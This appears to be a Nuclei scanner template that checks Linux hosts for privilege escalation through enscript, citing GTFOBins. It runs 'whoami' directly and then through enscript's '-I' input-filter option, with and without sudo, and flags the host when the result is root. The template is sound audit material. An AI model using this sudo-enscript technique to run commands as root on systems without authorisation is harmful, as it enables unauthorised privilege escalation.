code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  source: 'enscript /dev/null -qo /dev/null -I ''whoami >&2''

    '
- engine:
  - sh
  - bash
  matchers:
  - negative: true
    part: code_1_response
    type: word
    words:
    - root
  - condition: or
    dsl:
    - contains(code_2_response, "root")
    - contains(code_3_response, "root")
    type: dsl
  matchers-condition: and
  source: 'sudo enscript /dev/null -qo /dev/null -I ''whoami >&2''

    '
id: privesc-enscript
info:
  author: daffainfo
  description: 'enscript is a command-line tool used for converting text files to
    PostScript format for printing. It provides various options for formatting and
    manipulating the output, making it a useful tool for generating high-quality printed
    documents from text files.

    '
  metadata:
    max-request: 3
    verified: true
  name: enscript - Privilege Escalation
  reference:
  - https://gtfobins.github.io/gtfobins/enscript/
  severity: high
  tags: code,linux,enscript,privesc,local
self-contained: true
